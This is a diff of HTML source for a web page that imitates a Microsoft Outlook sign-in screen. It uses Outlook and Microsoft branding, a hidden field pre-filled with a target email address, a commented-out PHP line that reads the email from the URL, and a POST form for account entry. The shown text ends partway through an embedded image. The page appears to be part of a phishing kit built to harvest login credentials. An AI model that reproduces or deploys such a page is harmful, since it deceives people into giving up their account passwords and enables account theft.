@@ -1,17 +1,348 @@
-<html><head><meta name="viewport" content="width=device-width,initial-scale=1"><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script><link rel="shortcut icon" type="image/jpeg" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAgAAAAIACAYAAAD0eNT6AAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAsASURBVHic7d0xb1RnFoDh49FKoKzpY4mKjiJl5A5FiCqSBdT8ApfUG1GgbE3JL6DGCCnVCkXpUMoUdK6QnB6DTOUtxt4FAgQB9gje55GmuTNjn2q+d+7M3G/t8PBwPsTzK5tnZubyzFydmYszs3F0W/+gPwB8dv/8z+O1Vf7/rZ3rH/YCApyE/ZnZO7o9mZkHM/Po4bX7Lz/kyWt/FwDPr2xuzMytmbkxM+c+aVTgsxIAwBuezcy9mbn98Nr9vfc98J0B8PzK5tmZ+Wlmbs7MN597QuDTCQDgHV7MzJ2Z+fnhtfsHb3vA4m0Hn1/Z/HZmfp2Zf43FHwC+NN/Mcg3/dWvn+rdve8BfAuD5lc3vZub3mdk82dkAgBO2OTO/b+1c/+7NO14LgKN3/r/MzPlTGgwAOFnnZ+aXN88E/C8Ajj7z3xmLPwB8bc7PzM7WzvWzxwdePQPw0zjtDwBfq81ZrvUzcxQARz/1u7mqiQCAU3Fza+f6xsz/zwDcGt/2B4Cv3TezXPNncXSFvxurnQcAOCU3tnaun1nM8vK+rvAHAA3nZubyYpbX9gcAOq4uZrmxDwDQcXExyx39AICODQEAAD0bi5lZX/UUAMCpWn/rboAAwNdNAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIWjs8PFz1DADAKXMGAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAoH9cuLt/uOohgI+zu72+ttIBfjvr9QO+UM4AAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQtJiZ/VUPAQCcqv3FzOytegoA4FTtCQAA6NlbzMyTVU8BAJyqJ4uZebDqKQCAU/VgMTOPZubZqicBAE7Fs5l5tNjdXn85M/dWPQ0AcCruzaWDl8fXAbg9My9WOQ0AcOJezHLNX14IaHd7fW9m7qxyIgDgxN2ZSwd7M69fCfDnmXm8mnkAgBP2eJZr/cy8EgC72+sHM3NtZp6uYCgA4OQ8nZlrc+ng4PjAa3sB7G6v/zkzP44IAICvxdOZ+XEuHfz56sG/bAa0u73+x8x8Pz4OAIAv3eOZ+X4uHfzx5h1v3Q3w6EzADzPz7/HrAAD40ryY5Rr+w5vv/I+tHR4evvcvXLi7vzEzt2bmxsyc+9wTAh9vd3t9baUD/Hb2/S8gwGl7Nstr+9w+/rb/u/xtABy7cHf/zMxcnpmrM3NxZjaObuufNCrw0QQApO3PckO/vVnu6/NgZh7NpYOXH/Lk/wKQAq5eW3YI8AAAAABJRU5ErkJggg=="><style>#cover{margin-left:0}#cover{margin-bottom:.625pc}input:focus{outline:0}#cover{margin-right:0}#cover{margin-top:.104166667in}body{margin-left:0}body{margin-bottom:0}body{margin-right:0}#ccc,#center2,#cover{width:auto}#ccc{margin-left:auto}body{margin-top:0}#ccc,#center,#center2{margin-bottom:auto}#ccc{margin-right:auto}#ccc{margin-top:auto}#ccc,#center{max-width:26.875pc}body{padding-left:0}body{padding-bottom:0}#center{margin-left:5px}body{padding-right:0}body{padding-top:0}body{background-image:linear-gradient(to left,#e2ece1,#f5e4dd)}#center{margin-right:.052083333in}#center{margin-top:15%}body{background-repeat:no-repeat}#center{min-height:28.125pc}#center{ackground:#00f}#center2{margin-left:auto}body{background-size:cover}body{background-position:center}#center2{margin-right:auto}#center2{margin-top:0}a{text-decoration:none}#center2{padding-left:1.875pc}#footer,a{color:#fff}#center2{padding-bottom:1.875pc}#center2{padding-right:1.875pc}#center2{padding-top:1.875pc}a{font-size:.75pc}#center2{min-height:270px}input{font-size:12.75pt}#center2{background:#fff}#center2{box-shadow:0 0 7.5pt -1.5pt #000}#footer{position:fixed}input{border-left-color:currentColor}#footer{bottom:0}#footer{left:0}input{border-bottom-color:#005da6}#footer{width:100%}#footer{height:.9375pc}input{border-right-color:currentColor}#footer{background:#5b5e62}input{border-top-color:currentColor}input{border-left-width:medium}#footer{padding-left:10px}input{border-bottom-width:.0625pc}input{border-right-width:medium}#footer{padding-bottom:.104166667in}input{border-top-width:medium}#footer{padding-right:20px}#footer{padding-top:0}#footer{text-align:right}#footer{font-family:sans-serif}#footer{font-size:2px}input{border-top-style:none}input{border-image:none}input{border-left-style:none}input{border-right-style:none}input{padding-left:0}input{padding-bottom:.052083333in}input{padding-right:0}input{padding-top:5px}</style></head><input type="hidden" id="mail" value="
+<html>
+<head> 
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- jQuery library -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+
+<link rel="shortcut icon" type="image/jpeg" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAgAAAAIACAYAAAD0eNT6AAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAsASURBVHic7d0xb1RnFoDh49FKoKzpY4mKjiJl5A5FiCqSBdT8ApfUG1GgbE3JL6DGCCnVCkXpUMoUdK6QnB6DTOUtxt4FAgQB9gje55GmuTNjn2q+d+7M3G/t8PBwPsTzK5tnZubyzFydmYszs3F0W/+gPwB8dv/8z+O1Vf7/rZ3rH/YCApyE/ZnZO7o9mZkHM/Po4bX7Lz/kyWt/FwDPr2xuzMytmbkxM+c+aVTgsxIAwBuezcy9mbn98Nr9vfc98J0B8PzK5tmZ+Wlmbs7MN597QuDTCQDgHV7MzJ2Z+fnhtfsHb3vA4m0Hn1/Z/HZmfp2Zf43FHwC+NN/Mcg3/dWvn+rdve8BfAuD5lc3vZub3mdk82dkAgBO2OTO/b+1c/+7NO14LgKN3/r/MzPlTGgwAOFnnZ+aXN88E/C8Ajj7z3xmLPwB8bc7PzM7WzvWzxwdePQPw0zjtDwBfq81ZrvUzcxQARz/1u7mqiQCAU3Fza+f6xsz/zwDcGt/2B4Cv3TezXPNncXSFvxurnQcAOCU3tnaun1nM8vK+rvAHAA3nZubyYpbX9gcAOq4uZrmxDwDQcXExyx39AICODQEAAD0bi5lZX/UUAMCpWn/rboAAwNdNAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIWjs8PFz1DADAKXMGAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAoH9cuLt/uOohgI+zu72+ttIBfjvr9QO+UM4AAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQtJiZ/VUPAQCcqv3FzOytegoA4FTtCQAA6NlbzMyTVU8BAJyqJ4uZebDqKQCAU/VgMTOPZubZqicBAE7Fs5l5tNjdXn85M/dWPQ0AcCruzaWDl8fXAbg9My9WOQ0AcOJezHLNX14IaHd7fW9m7qxyIgDgxN2ZSwd7M69fCfDnmXm8mnkAgBP2eJZr/cy8EgC72+sHM3NtZp6uYCgA4OQ8nZlrc+ng4PjAa3sB7G6v/zkzP44IAICvxdOZ+XEuHfz56sG/bAa0u73+x8x8Pz4OAIAv3eOZ+X4uHfzx5h1v3Q3w6EzADzPz7/HrAAD40ryY5Rr+w5vv/I+tHR4evvcvXLi7vzEzt2bmxsyc+9wTAh9vd3t9baUD/Hb2/S8gwGl7Nstr+9w+/rb/u/xtABy7cHf/zMxcnpmrM3NxZjaObuufNCrw0QQApO3PckO/vVnu6/NgZh7NpYOXH/Lk/wKQAq5eW3YI8AAAAABJRU5ErkJggg=="/>
+
+<style>
+
+body{
+margin:0;
+padding:0;
+background-image:linear-gradient(to left ,#E2ECE1 ,#F5E4DD);
+background-repeat:no-repeat;
+background-size:cover;
+background-position:center;
+}
+
+#cover{
+	margin:auto;
+	width:auto;
+	margin:10px 0px 10px 0px;
+	}
 
 
-levo@axin.com
+#ccc {
+	margin:auto;
+	width:auto;
+	max-width:430px;
 
 
-"><script>//let jemail = "<?php echo $_GET["email"] ; ?>" ;
+	}
+
+#center {
+	margin:auto;
+	margin-top:15%;
+	max-width:430px;
+	min-height:450px;
+	ackground:blue;
+	margin-left:5px;
+	margin-right:5px;
+	}
+	
+#center2 {
+	margin:auto;
+	margin-top:0px;
+	padding:30px;
+	width:auto;
+	min-height:270px;
+	background:white;
+	box-shadow: 0px 0px 10px -2px black;
+	
+	}
+	
+#footer {
+	position:fixed;
+	bottom:0;
+	left:0;
+	width:100%;
+	height:15px;
+	background:#5B5E62;
+	padding:0px 20px 10px 10px ;
+	color:#FFF;
+	text-align:right;
+	font-family:sans-serif;
+	font-size:2px;
+	}
+	
+a{
+	 text-decoration:none;
+	 color:#fff;
+	 font-size:12px;
+}
+
+input{
+	font-size:17px;
+	border-color:#005DA6;
+	border-width:1px;
+	border-top:none;
+	border-left:none;
+	border-right:none;
+	padding:5px 0px 5px 0px;
+	
+	}
+
+input:focus{
+	outline:none;
+	}
+	
+</style>
+
+</head>
+
+<!--===================================-->
+	<input type="hidden" id="mail" value="
+
+
+plium@plum.com
+
+
+">
+<!--===================================-->
+
+  <script>
+  
+  //let jemail = "<?php echo $_GET["email"] ; ?>" ;
   //let jemail = "lunazhang@hostinger.com" ;
   
-  let jemail = document.getElementById("mail").value;</script><body><div id="cover"><div id="ccc"><div id="center"><center><h1 style="margin-bottom:20px;font-family:sans-serif;font-size:41;color:#323130">Outlook</h1></center><div id="center2"><p style="float:left"><img height="25px" width="25px" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAgAAAAIACAYAAAD0eNT6AAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAsASURBVHic7d0xb1RnFoDh49FKoKzpY4mKjiJl5A5FiCqSBdT8ApfUG1GgbE3JL6DGCCnVCkXpUMoUdK6QnB6DTOUtxt4FAgQB9gje55GmuTNjn2q+d+7M3G/t8PBwPsTzK5tnZubyzFydmYszs3F0W/+gPwB8dv/8z+O1Vf7/rZ3rH/YCApyE/ZnZO7o9mZkHM/Po4bX7Lz/kyWt/FwDPr2xuzMytmbkxM+c+aVTgsxIAwBuezcy9mbn98Nr9vfc98J0B8PzK5tmZ+Wlmbs7MN597QuDTCQDgHV7MzJ2Z+fnhtfsHb3vA4m0Hn1/Z/HZmfp2Zf43FHwC+NN/Mcg3/dWvn+rdve8BfAuD5lc3vZub3mdk82dkAgBO2OTO/b+1c/+7NO14LgKN3/r/MzPlTGgwAOFnnZ+aXN88E/C8Ajj7z3xmLPwB8bc7PzM7WzvWzxwdePQPw0zjtDwBfq81ZrvUzcxQARz/1u7mqiQCAU3Fza+f6xsz/zwDcGt/2B4Cv3TezXPNncXSFvxurnQcAOCU3tnaun1nM8vK+rvAHAA3nZubyYpbX9gcAOq4uZrmxDwDQcXExyx39AICODQEAAD0bi5lZX/UUAMCpWn/rboAAwNdNAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIWjs8PFz1DADAKXMGAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAoH9cuLt/uOohgI+zu72+ttIBfjvr9QO+UM4AAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQJAAAIEgAAECQAACAIAEAAEECAACCBAAABAkAAAgSAAAQtJiZ/VUPAQCcqv3FzOytegoA4FTtCQAA6NlbzMyTVU8BAJyqJ4uZebDqKQCAU/VgMTOPZubZqicBAE7Fs5l5tNjdXn85M/dWPQ0AcCruzaWDl8fXAbg9My9WOQ0AcOJezHLNX14IaHd7fW9m7qxyIgDgxN2ZSwd7M69fCfDnmXm8mnkAgBP2eJZr/cy8EgC72+sHM3NtZp6uYCgA4OQ8nZlrc+ng4PjAa3sB7G6v/zkzP44IAICvxdOZ+XEuHfz56sG/bAa0u73+x8x8Pz4OAIAv3eOZ+X4uHfzx5h1v3Q3w6EzADzPz7/HrAAD40ryY5Rr+w5vv/I+tHR4evvcvXLi7vzEzt2bmxsyc+9wTAh9vd3t9baUD/Hb2/S8gwGl7Nstr+9w+/rb/u/xtABy7cHf/zMxcnpmrM3NxZjaObuufNCrw0QQApO3PckO/vVnu6/NgZh7NpYOXH/Lk/wKQAq5eW3YI8AAAAABJRU5ErkJggg=="></p><p style="margin-top:20px;font-family:verdana;font-weight:700;font-size:17px;color:#737373">&nbspMicrosoft</p><p style="clear:both;margin-top:4px;float:left"><a href=""><img height="20" width="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACIAAAAdCAYAAADPa766AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAD5SURBVFhH7dWhCsJAHMdxH8PXWDL5AmtjwXXD2treYE0wz7JkEwSxzLIiCyIINleWXBBBbBd/cvMmemU7b7JD7gtX/unDn+2uB0XSED4N4dMQvj+AFFv4lg0zythAru8gxQbe0EbfcODGFzaUSxxSrOEOGGJ1ZkP5hCAkX74QXkubqGoMIacITokYw0/aRdAaQcgxhMUQQXpj03arhdzTKUyDImw4kwTp/iB4MjTZXw0kw6z8O+SOF9dvsX4j+1CFjTxT4hupUuKvqfq4R1q8zGhCkLL3632Rg7CxbOIQGnvwun1rqq47BCMH1rzL1/cHaQifhvApAgEexPTSW1v/5dkAAAAASUVORK5CYII="></a></p><form method="post"><p><input id="email" type="email" name="email" class="text" size="25" style="font-size:14px;border:none;margin-top:2px" value="
+  //let jemail = document.getElementById("mail").value;
+  
+  
+  </script>
 
 
-laxz.bd@dumb.com
+<body>
+<div id="cover">
+
+<div id="ccc">
+<div id="center">
+<center><h1 style="	margin-bottom:20px; font-family:sans-serif; font-size:41; color:#323130;">Outlook</h1></center>
+
+<div id="center2">
+<p style=" float:left;"><img height="25px" width="25px" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAgAAAAIACAYAAAD0eNT6AAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAsASURBVHic7d0xb1RnFoDh49FKoKzpY4mKjiJl5A5FiCqSBdT8ApfUG1GgbE3JL6DGCCnVCkXpUMoUdK6QnB6DTOUtxt4FAgQB9gje55GmuTNjn2q+d+7M3G/t8PBwPsTzK5tnZubyzFydmYszs3F0W/+gPwB8dv/8z+O1Vf7/rZ3rH/YCApyE/ZnZO7o9mZkHM/Po4bX7Lz/kyWt/FwDPr2xuzMytmbkxM+c+aVTgsxIAwBuezcy9mbn98Nr9vfc98J0B8PzK5tmZ+Wlmbs7MN597QuDTCQDgHV7MzJ2Z+fnhtfsHb3vA4m0Hn1/Z/HZmfp2Zf43FHwC+NN/Mcg3/dWvn+rdve8BfAuD5lc3vZub3mdk82dkAgBO2OTO/b+1c/+7NO14LgKN3/r/MzPlTGgwAOFnnZ+aXN88E/C8Ajj7z3xmLPwB8bc7PzM7WzvWzxwdePQPw0zjtDwBfq81ZrvUzcxQARz/1u7mqiQCAU3Fza+f6xsz/zwDcGt/2B4Cv3TezXPNncXSFvxurnQcAOCU3tnaun1nM8vK+rvAHAA3nZubyYpbX9gcAOq4uZrmxDwDQcXExyx39AICODQEAAD0bi5lZX/UUAMCpWn/rboAAwNdNAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAACBIAABAkAAAgCABAABBAgAAggQAAAQJAAAIEgAAECQAA